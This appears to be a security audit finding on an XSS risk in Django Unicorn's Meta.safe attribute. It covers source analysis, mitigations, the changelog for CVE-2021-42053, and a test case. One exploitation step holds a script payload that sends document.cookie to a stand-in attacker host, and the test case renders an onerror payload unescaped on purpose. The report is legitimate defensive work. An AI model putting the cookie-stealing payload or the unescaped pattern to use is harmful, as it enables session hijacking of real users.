# VULNERABILITIES

## Cross-Site Scripting (XSS) through Meta.safe Component Attribute

### Description
Django Unicorn has a feature that allows developers to mark specific component fields as "safe" using the `Meta.safe` attribute, which bypasses HTML encoding protection. When a field is marked as safe, its content is rendered directly to the page without HTML encoding. If this field contains user-controlled data, it creates a Cross-Site Scripting vulnerability where attackers can inject malicious JavaScript that executes in users' browsers.

### Impact
This vulnerability allows attackers to execute arbitrary JavaScript in victims' browsers, potentially leading to session hijacking, credential theft, personal data exfiltration, and other client-side attacks. Since components often display data that might originate from user input or database records containing user-supplied content, this is a significant risk.

### Vulnerability Rank
High

### Currently Implemented Mitigations
Django Unicorn has implemented default HTML encoding for all component field values since version 0.36.0 (fixing CVE-2021-42053). This means developers must explicitly opt-in to disable this protection by using the `Meta.safe` attribute, rather than it being disabled by default.

### Missing Mitigations
- Strong warnings in documentation highlighting the security implications of using `Meta.safe`
- Runtime warnings when using `Meta.safe` with fields that contain user input
- Content Security Policy implementation guidelines
- A safer alternative to `Meta.safe` that allows HTML but sanitizes it more thoroughly

### Preconditions
1. A component field must be explicitly marked as safe using `Meta.safe`
2. The field must contain user-controlled content directly or indirectly
3. The component must be rendered in a browser context

### Source Code Analysis
In `utils.py`, the `sanitize_html` function uses Django's `mark_safe`:

```python
def sanitize_html(html: str) -> SafeText:
    """
    Escape all the HTML/XML special characters with their unicode escapes, so
    value is safe to be output in JSON.
    """
    html = html.translate(_json_script_escapes)
    return mark_safe(html)  # noqa: S308
```

The `noqa: S308` comment suggests this was flagged by a static analyzer as potentially unsafe but the warning was suppressed.

In the provided code in `django_unicorn/views/__init__.py`, we can see how the `safe` fields are processed:

```python
# Get set of attributes that should be marked as `safe`
safe_fields = []
if hasattr(component, "Meta") and hasattr(component.Meta, "safe"):
    if isinstance(component.Meta.safe, Sequence):
        for field_name in component.Meta.safe:
            if field_name in component._attributes().keys():
                safe_fields.append(field_name)

# Mark safe attributes as such before rendering
for field_name in safe_fields:
    value = getattr(component, field_name)
    if isinstance(value, str):
        setattr(component, field_name, mark_safe(value))  # noqa: S308
```

The code allows developers to mark certain fields as "safe" through the Meta class, and for these fields, Django's HTML encoding is bypassed, which can lead to XSS if those fields contain user input.

In the changelog, there's evidence this was a security vulnerability fixed in v0.36.0:

```markdown
## v0.36.0

- Security fix: for CVE-2021-42053 to prevent XSS attacks (reported by [Jeffallan](https://github.com/Jeffallan)).

**Breaking changes**

- responses will be HTML encoded going forward (to explicitly opt-in to previous behavior use [safe](views.md#safe))
```

The exploitation path works as follows:
1. A developer creates a component with a field that contains user input
2. The developer marks this field as "safe" in the Meta class
3. A malicious user inputs JavaScript code like `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`
4. When the component renders, this code executes in the browser of any user viewing the component

### Security Test Case
1. Create a new Django project with Django Unicorn installed
2. Create a component with a view that includes user-controlled data and marks it as safe:

```python
from django_unicorn.components import UnicornView

class VulnerableComponentView(UnicornView):
    user_content = ""

    class Meta:
        safe = ("user_content",)

    def mount(self):
        # In a real scenario, this might come from a database or user input
        self.user_content = "<img src=x onerror='alert(document.cookie)'>"
```

3. Create the corresponding template:

```html
<div>
  <h3>User Content:</h3>
  {{ user_content }}

  <input unicorn:model="user_content" type="text" placeholder="Enter some content" />
  <button unicorn:click="$refresh">Update Content</button>
</div>
```

4. Access the component through a browser
5. Observe that the JavaScript executes, displaying the cookies in an alert box
6. To confirm it's the `Meta.safe` causing the issue, remove the field from the safe tuple and verify the script is rendered as text instead of being executed

This vulnerability exists because developers have the option to bypass HTML encoding protections, which if misused with user-controlled data, leads to XSS attacks.
